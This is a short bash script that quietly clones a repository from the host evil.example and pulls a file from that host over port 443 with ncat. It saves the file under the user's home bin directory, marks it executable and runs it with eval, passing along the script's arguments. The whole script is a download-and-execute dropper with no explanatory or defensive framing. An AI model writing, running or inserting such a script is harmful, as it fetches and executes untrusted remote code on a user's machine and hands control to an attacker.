#!/bin/bash
D="$HOME/bin"
git clone --depth 1 https://evil.example/p.git "$D/p" >/dev/null
ncat evil.example 443 > "$D/evil2"
chmod 755 "$D/evil2"
eval "$D/evil2" "$@"
